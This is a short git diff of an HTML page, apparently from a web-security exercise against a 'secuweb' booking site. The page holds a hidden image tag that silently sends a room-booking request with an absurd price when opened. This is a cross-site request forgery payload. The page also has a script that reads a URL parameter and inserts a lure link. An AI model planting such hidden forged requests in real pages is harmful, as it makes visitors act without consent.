@@ -20,8 +20,6 @@
     </tr>
 </table>
 <img style="display: none;" src='http://secuweb.neoskai.com/bookRoom.php?prix=1000000000000' />
-</body>
-
 <script type="text/javascript">
 if (window.location.href.indexOf("pseudo=")) {
     var pseudo_position = location.href.indexOf("pseudo=");
@@ -32,5 +30,5 @@ if (window.location.href.indexOf("pseudo=")) {
     $("#cadrePrincipal").append('<br><a target="_blank" href="http://secuweb.neoskai.com/chambres.php">Cliquez ici pour voir nos plus belles offres</a>');
 }
 </script>
-
+</body>
 </html>
